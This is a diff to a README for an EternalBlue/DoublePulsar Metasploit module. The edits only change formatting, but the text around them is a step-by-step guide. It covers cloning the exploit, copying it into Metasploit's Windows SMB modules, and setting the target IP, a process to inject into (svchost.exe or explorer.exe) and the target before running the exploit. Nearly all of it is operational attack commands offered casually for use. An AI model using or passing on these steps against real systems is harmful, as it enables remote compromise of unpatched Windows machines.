@@ -6,12 +6,9 @@
 ~]# git clone https://github.com/grglzrv/Eternalblue-Doublepulsar-Metasploit.git
 ~]# cd Eternalblue-Doublepulsar-Metasploit
 ~]# cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
-<br>
-<style>
-strong {color:red;}
-</style>
+
 <strong>Note !!!</strong>: Also you may copy 'deps' directory to /usr/share/metasploit-framework/modules/exploits/windows/smb
-<br>
+
 ~]# mkdir -p /root/.wine/drive_c/
 </pre>
 # How to use
@@ -24,7 +21,7 @@ strong {color:red;}
 - show options
 </pre>
 <br>
- <strong>For Windows x64</strong>
+<strong>For Windows x64</strong>
 <br>
 <pre>
  - set RHOST (Target IP)
@@ -35,10 +32,10 @@ strong {color:red;}
  - show targets
  - set target 8
  - run or exploit
- </pre>
- <br>
- <strong>For Windows x86</strong>
- <br>
+</pre>
+<br>
+<strong>For Windows x86</strong>
+<br>
 <pre>
  - set RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or set PROCESSINJECT explorer.exe
@@ -48,5 +45,5 @@ strong {color:red;}
  - show targets
  - set target 8
  - run or exploit
- </pre>
- ## Have a Fun! :)
+</pre>
+ ##+ Have a Fun! :)
